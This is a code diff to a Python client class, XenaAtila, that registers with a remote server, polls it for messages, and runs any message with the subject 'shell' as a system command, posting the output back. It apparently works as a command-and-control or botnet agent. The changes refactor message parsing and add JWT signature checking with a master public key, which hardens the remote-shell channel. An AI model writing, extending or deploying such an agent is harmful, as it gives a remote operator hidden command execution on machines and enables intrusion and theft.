@@ -1,5 +1,6 @@
 import json
 import logging
+import python_jwt as jwt
 
 from time import sleep
 from env import Env
@@ -22,6 +23,18 @@ class Message:
     self.content = content
     self.status = status
     self.reply_to = reply_to
+
+  @staticmethod
+  def from_json(json):
+    return Message(
+      id = json['id'],
+      from_id = json['from'],
+      to = json['to'],
+      subject = json['subject'],
+      content = json['content'],
+      status = json['status'],
+      reply_to = json['replyTo'],
+    )
 
   def serialize(self):
     return {
@@ -68,21 +81,18 @@ class XenaAtila:
 
     # Loop over each message.
     for maybe_message in maybe_messages:
-      message = Message(
-        id = maybe_message['id'],
-        from_id = maybe_message['from'],
-        to = maybe_message['to'],
-        subject = maybe_message['subject'],
-        content = maybe_message['content'],
-        status = maybe_message['status'],
-        reply_to = maybe_message['replyTo'],
-      )
+      message = Message.from_json(maybe_message)
 
       subject = message.subject
-      content = b64decode(message.content).decode('utf-8')
+      # content = b64decode(message.content).decode('utf-8')
+      content = jwt.verify_jwt(message.content, Env()['MASTER_PUBLIC_KEY'], ['RS512'])[1]
+
+      print()
+      print(content)
+      print()
 
       if subject == 'shell':
-        shell_output = System.do(content)
+        shell_output = System.do(content['shell'])
         
         message_insertion = post(self.remote + "/v1/messages", data = {
           'from': client_id,
@@ -95,25 +105,26 @@ class XenaAtila:
         if (message_insertion.status_code != 200):
           continue
         
-        message_ack = post(self.remote + '/v1/messages', data = {
+        message_ack = post(self.remote + '/v1/messages/ack', data = {
           'id': message.id,
-          'status': 'STATUS'
         })
 
         if (message_ack.status_code != 200):
           logging.warn('Message ACK failure has occured, but it is not handled!')
+          logging.debug(message_ack.json())
 
   # Make yourself known to the remote host.
   def identify(self, remote_host: str) -> bool:
     response = post(remote_host + '/v1/clients', data = {
       'id': client_id,
-      'identificationKey': 'fakekeytemp',
+      'publicKey': 'nokey',
       'status': 'ALIVE',
     })
 
     # The request has failed. If 409 is returned, means that we're already recognized peer.
     if response.status_code != 200 and response.status_code != 409:
       logging.debug('Identification failed with ' + str(response.status_code) + ' status code for ' + remote_host)
+      logging.debug(response.json())
       return False
     
     return True
